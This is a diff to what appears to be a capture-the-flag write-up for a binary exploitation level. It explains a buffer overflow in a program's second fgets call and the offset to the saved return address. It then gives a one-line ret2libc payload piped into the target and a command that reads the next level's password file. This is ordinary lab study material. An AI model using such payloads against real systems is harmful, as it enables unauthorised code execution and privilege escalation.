@@ -1,5 +1,7 @@
-cd /tmp
+We can see in the source that the second fgets has a vulnerability : it takes 100 characters and puts it in a 64 bytes buffer, we can overflow it.
+To access the second fgets, we need to input "dat_wil", and then find the offset to access the saved rip : buffer_length (64) + 16.
+With that offset, we can easily perform a ret2libc.
 
-(python -c 'print("dat_wil")' ; python -c 'print("admin\0" + "\x90"*74 + "\xd0\xae\xe6\xf7" + "\xe0\xeb\xe5\xb7" + "\xec\x97\xf8\xf7")';cat) | ~/level01
+(python -c 'print("dat_wil")' ; python -c 'print("\x90"*80 + "\xd0\xae\xe6\xf7" + "\xe0\xeb\xe5\xb7" + "\xec\x97\xf8\xf7")';cat) | ~/level01
 
 cat ../level02/.pass
